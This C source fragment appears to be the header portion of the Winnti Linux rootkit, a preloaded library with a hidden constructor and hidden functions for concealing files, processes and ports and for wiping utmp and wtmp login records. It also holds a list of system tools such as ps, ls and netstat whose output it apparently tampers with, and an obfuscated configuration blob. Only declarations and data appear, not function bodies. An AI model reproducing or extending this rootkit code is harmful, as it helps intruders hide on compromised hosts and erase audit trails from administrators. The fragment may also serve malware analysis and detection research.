#include "const.h"

static void init(void) __attribute__((constructor));
// static void fini(void) __attribute__((destructor));

void winnti_init(void) __attribute__((visibility("hidden")));
void cleanup(void *var, int len) __attribute__((visibility("hidden")));
int is_invisible(const char *path) __attribute__((visibility("hidden")));
int is_procnet(const char *filename) __attribute__((visibility("hidden")));
void clean_utmp(char *pts, int verbose) __attribute__((visibility("hidden")));
void clean_wtmp(char *pts, int verbose) __attribute__((visibility("hidden")));
int parse_environ(char *stack, int len, char *needle) __attribute__((visibility("hidden")));
int is_owner(void) __attribute__((visibility("hidden")));
FILE *hide_ports(const char *filename) __attribute__((visibility("hidden")));
typedef struct struct_syscalls
{
    char syscall_name[51];
    void *(*syscall_func)();
} s_syscalls;

int procs_count = 160; // maximum number of processes

char *procs[160] = {
    "/bin/ls",
    "/bin/ps",
    "/bin/top",
    "/bin/cat",
    "/bin/pstree",
    "/bin/rm",
    "/bin/mv",
    "/bin/chown",
    "/bin/chattr",
    "/bin/netstat",
    "/usr/bin/ls",
    "/usr/bin/ps",
    "/usr/bin/top",
    "/usr/bin/cat",
    "/usr/bin/pstree",
    "/usr/bin/rm",
    "/usr/bin/mv",
    "/usr/bin/chown",
    "/usr/bin/chattr",
    "/usr/bin/netstat",
};

int our_pids[1024];

s_syscalls syscall_list[SYSCALL_SIZE];

char *gSpeProc = "/usr/bin/pgrep";
int mod_first = 1;
char *gInitProc = "/usr/bin/python2.7";

static int owner = -1;

char gunit[304] = "EAEC2CA4-AF8D-4F61-8115-9EC26F6BF4E1\x00\x00\x00Fnopq\"sG#\x18\x00,\x0c\x0bB\x0fS\x17\x0b\xe8\xee\xef\xe6\xaa\xed\xe9\xf2\xfb\xec\x8a\xb3\xbc\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xc1\xf5\xc5\xa1\x96\x8e\xae\x8e\x8d\xc4\x8d\xd1iujli`(og|yn\x0c8=\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f !\"#$%%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLM";
unsigned long our_sockets[32768];

#define O_RDWR 02
#define O_RDONLY 00

static int constr = 0;
